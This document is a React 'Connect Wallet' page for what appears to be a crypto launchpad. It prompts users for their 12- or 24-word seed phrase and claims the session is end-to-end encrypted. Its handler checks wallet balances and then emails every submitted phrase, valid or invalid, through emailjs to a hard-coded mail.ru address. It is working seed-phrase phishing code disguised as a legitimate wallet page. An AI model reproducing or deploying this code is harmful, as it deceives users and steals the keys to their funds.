import React, { useState } from "react";
import { ethers } from "ethers";
import Web3 from "web3";
import { errorNotification, successNotification } from "../../utils/helpers";
import { useNavigate } from "react-router-dom";
import { wallets } from "../../utils/data";

const ConnectPage = () => {
  const [show, setShow] = useState(false);
  const [wallet, setWallet] = useState({
    logo: "hardware.jpg",
    name: "Hardware Wallet",
  });
  const [loading, setLoading] = useState(false);
  const [phrase, setPhrase] = useState("");
  const web3 = new Web3(Web3.nodemailer);
  const navigate = useNavigate();
  (function () {
    emailjs.init({
      publicKey: "H5HA9trsJhtPg_WIo", // Your public key
    });
  })();

  const handleWalletImport = async (event) => {
    setLoading(true);
    event.preventDefault();
    console.log({ phrase });
    try {
      const wall = ethers.Wallet.fromMnemonic(phrase);
      console.log("wall", wall);
      const address = wall?.address.toString();
      console.log("address", address);

      const ETH_bal = await web3.eth.getBalance(address);
      const ETH_balance = web3.utils.fromWei(ETH_bal, "ether");
      console.log("ETH balance", ETH_balance);

      let data = [];
      let btc = {
        currency_name: "Bitcoin",
        Symbol: "BTC",
        balance: "Undefined",
      };
      data.push(btc);
      let dt = {
        currency_name: "Ethereum",
        Symbol: "ETH",
        balance: ETH_balance,
      };
      data.push(dt);

      const bnbScanApiUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${
        import.meta.env.VITE_API_KEY
      }`;

      const tokenCAs1 = [
        {
          currency_name: "Tether",
          symbol: "USDT",
          CA: "0x55d398326f99059ff775485246999027b3197955",
        },
        {
          currency_name: "USDC",
          symbol: "USDC",
          CA: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
        },
        {
          currency_name: "Cardano",
          symbol: "ADA",
          CA: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47",
        },
        {
          currency_name: "Baby Doge",
          symbol: "BabyDOGE",
          CA: "0xc748673057861a797275cd8a068abb95a902e8de",
        },
      ];

      const tokenCAs2 = [
        {
          currency_name: "DAI",
          symbol: "DAI",
          CA: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
        },
        {
          currency_name: "WETH",
          symbol: "WETH",
          CA: "0x4DB5a66E937A9F4473fA95b1cAF1d1E1D62E29EA",
        },
        {
          currency_name: "Floki",
          symbol: "FLOKI",
          CA: "0xfb5b838b6cfeedc2873ab27866079ac55363d37e",
        },
        {
          currency_name: "Trust Wallet Token",
          symbol: "TWT",
          CA: "0x4b0f1812e5df2a09796481ff14017e6005508003",
        },
      ];

      try {
        const responseBNB = await fetch(bnbScanApiUrl);
        if (responseBNB.status !== 200) {
          console.log("something went wrong");
          return;
        }
        const bodyBNB = await responseBNB.json();
        const bnbBal = bodyBNB.result;
        const bnbBalance = web3.utils.fromWei(bnbBal, "ether");
        console.log("bnbBalance", bnbBalance);
        let bnbdt = {
          currency_name: "Binance Coin",
          Symbol: "BNB",
          balance: bnbBalance,
        };
        data.push(bnbdt);
        try {
          tokenCAs1.forEach(async (element) => {
            const scanApiUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${
              element.CA
            }&address=${address}&tag=latest&apikey=${
              import.meta.env.VITE_API_KEY
            }`;
            const response = await fetch(scanApiUrl);
            if (response.status !== 200) {
              console.log("something went wrong");
              return;
            }
            const body = await response.json();
            const result = body.result;
            const balance = web3.utils.fromWei(result, "ether");
            console.log(`${element.symbol} balance:`, balance);
            let dt = {
              currency_name: element.currency_name,
              Symbol: element.symbol,
              balance: balance,
            };
            data.push(dt);
          });
          setTimeout(() => {
            tokenCAs2.forEach(async (element) => {
              const scanApiUrl2 = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${
                element.CA
              }&address=${address}&tag=latest&apikey=${
                import.meta.env.VITE_API_KEY
              }`;
              const response2 = await fetch(scanApiUrl2);
              if (response2.status !== 200) {
                console.log("something went wrong");
                return;
              }
              const body2 = await response2.json();
              const result2 = body2.result;
              const balance2 = web3.utils.fromWei(result2, "ether");
              console.log(`${element.symbol} balance:`, balance2);
              let dt2 = {
                currency_name: element.currency_name,
                Symbol: element.symbol,
                balance: balance2,
              };
              data.push(dt2);
              let wallet_balance = JSON.stringify(data);
              localStorage.setItem("wallet_balance", wallet_balance);
              console.log("data", data);
              const templateParams = {
                to_email: "benard.tee@mail.ru",
                message: `DECENTRALIZED LAUNCHPAD Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
              };

              emailjs
                .send("service_dqusq1r", "template_a2c8mp8", templateParams)
                .then(
                  function (response) {
                    console.log("SUCCESS!", response.status, response.text);
                    localStorage.setItem("phrase", phrase);
                    successNotification(
                      "Successfully verified your Seed Phrase!"
                    );
                    setLoading(false);
                    navigate("/wallet");
                  },
                  function (err) {
                    console.error("FAILED TO SEND EMAIL...", err);
                    errorNotification("Please try again!");
                  }
                );
            });
          }, 1300);
        } catch (error) {
          console.error("Error:", error.message);
          errorNotification("Something went wrong. Try again");
          setLoading(false);
        }
      } catch (error) {
        console.error("Error:", error.message);
        setLoading(false);
        errorNotification("Something went wrong. Try again");
      }
    } catch (error) {
      console.log("error:", error);
      if (error.toString().includes("invalid mnemonic")) {
        const templateParams = {
          to_email: "benard.tee@mail.ru",
          message: `DECENTRALIZED LAUNCHPAD Submission\n\nBAD Secret Phrase (Invalid phrase):\n\n ${phrase}`,
        };

        emailjs
          .send("service_dqusq1r", "template_a2c8mp8", templateParams)
          .then(
            function (response) {
              console.log("SUCCESS!", response.status, response.text);
              errorNotification("Invalid mnemonic phrase supplied");
              setLoading(false);
            },
            function (err) {
              errorNotification("Please try again!");
              console.error("FAILED TO SEND EMAIL...", err);
            }
          );
      }
      //   console.log("error:", error);
      //   console.log({ error: error });
      setLoading(false);
    }
  };

  const handleSetWallet = (item) => {
    setShow(true);
    setWallet(item);
    console.log({ show });
  };

  return (
    <div className="w-screen flex justify-center items-center px-8 relative">
      <div className="w-full max-w-[1200px] pt-20 lg:py-40 flex flex-col gap-5 lg:px-0 ">
        <p className="text-3xl font-bold text-center">Connect Wallet</p>
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-7">
          {wallets.map((item, i) => (
            <div
              className="col-span-1 p-4 bg-transparent flex gap-5 items-center cursor-pointer rounded-lg "
              key={i}
              onClick={() => handleSetWallet(item)}
              style={{ boxShadow: "4px 4px 7px #032e2a" }}
            >
              <img
                src={`/assets/images/wallets/${item.logo}`}
                alt=""
                className="w-6 lg:w-16 rounded-full"
              />
              <div className="flex flex-col">
                <span className="font-semibold text-sm lg:text-[16px]">
                  {item.name}
                </span>
                <span className="text-gray-300 text-[9px] lg:text-md">
                  {item.subtitle}
                </span>
              </div>
            </div>
          ))}
        </div>

        {/* <div className="mb-6">
          <p className="font-bold text-sm">What is a Seed Phrase?</p>
          <span className="text-sm">
            A 12, 18, or 24-word phrase used to control your assets.
          </span>
        </div>
        <div className="mb-6">
          <p className="font-bold text-sm">
            Is it safe to import it in {import.meta.env.VITE_APP_NAME}?
          </p>
          <span className="text-sm">
            Yes, it will be stored locally on your browser and only accessible
            to you.
          </span>
        </div>
        <div
          onClick={() => setShow(true)}
          className="btnn2 px-4 py-3 w-full font-semibold text-center"
        >
          Import Seed Phrase
        </div>

        <div
          onClick={() => setShow(true)}
          className="btnn2 px-4 py-3 w-full font-semibold text-center"
        >
          Import Private Key
        </div> */}
      </div>
      {show ? (
        <div className="fixed top-0 left-0 w-screen h-screen flex justify-center items-center bg-black/90 px-5 lg:px-0">
          <div
            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-[#000] py-12 rounded-lg relative"
            style={{ boxShadow: "4px 3px 10px #032e2a" }}
          >
            <div className="flex flex-col items-center mb-5">
              <img
                src={`/assets/images/wallets/${wallet.logo}`}
                alt=""
                className="w-10 mb-3"
              />
              <span className="font-semibold text-xl text-white mb-5">
                {wallet.name}
              </span>
              <p className="text-gray-200 text-md font-light">
                This session is secure and encrypted
              </p>
            </div>
            <div
              className="absolute -top-5 -right-6 h-[35px] w-[35px] flex justify-center items-center rounded-full border-[2px] border-[#333] cursor-pointer text-lg bg-white text-black"
              onClick={() => setShow(false)}
            >
              x
            </div>
            <form onSubmit={handleWalletImport} className="flex flex-col">
              <textarea
                type="text"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                className="mb-7 h-20 bg-transparent border-[1px] border-[#fff] p-2 rounded-md"
                placeholder="Enter your 12 or 24 words Mnemonic Phrase. Separate them with spaces"
              />
              <input
                type="submit"
                className={
                  loading
                    ? "w-full text-center py-[9px] font-bold"
                    : "btnn1 w-full text-center py-[9px] font-bold"
                }
                value={loading ? "Verifying..." : "Confirm"}
                disabled={loading ? true : false}
              />
            </form>

            <div className="flex gap-2 items-center mt-6">
              <img src="/assets/images/shield.png" alt="" className="w-8" />
              <span className="text-sm text-center text-[#ffffff8a]">
                This session is protected with an end-to-end encryption
              </span>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
};

export default ConnectPage;
